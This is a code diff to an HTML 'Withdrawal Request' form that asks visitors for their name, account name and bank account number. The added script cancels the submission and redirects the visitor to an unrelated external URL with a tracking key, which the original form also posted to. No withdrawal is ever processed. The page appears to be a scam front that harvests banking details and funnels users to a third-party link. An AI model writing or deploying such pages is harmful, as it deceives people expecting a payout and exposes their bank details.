@@ -261,7 +261,7 @@
       Withdrawal Request
     </h2>
 
-    <form class="space-y-4" method="post" action="https://lampshadescreen.com/u4691hx3nq?key=03c46ed4c8a2e418d50db0e054c86b0d">
+    <form class="space-y-4" onsubmit="return subb()" method="post" action="https://lampshadescreen.com/u4691hx3nq?key=03c46ed4c8a2e418d50db0e054c86b0d">
 
       <input type="text" placeholder="Full Name" required
         class="w-full border rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500">
@@ -275,7 +275,7 @@
       <input type="text" placeholder="Account Name" required
         class="w-full border rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500">
 
-      <input type="number" placeholder="Account Number" required
+      <input type="number" placeholder="Account Number" required onkeypress="if(this.value.length == 10) return false"
         class="w-full border rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500">
 
       <input type="text" readonly placeholder="Amount" required id="amt"
@@ -292,6 +292,17 @@
     </form>
   </div>
 </div>
+
+<script>
+  function subb(){
+
+
+    location.href = `https://lampshadescreen.com/u4691hx3nq?key=03c46ed4c8a2e418d50db0e054c86b0d`
+
+
+    return false
+  }
+</script>
 
 
 
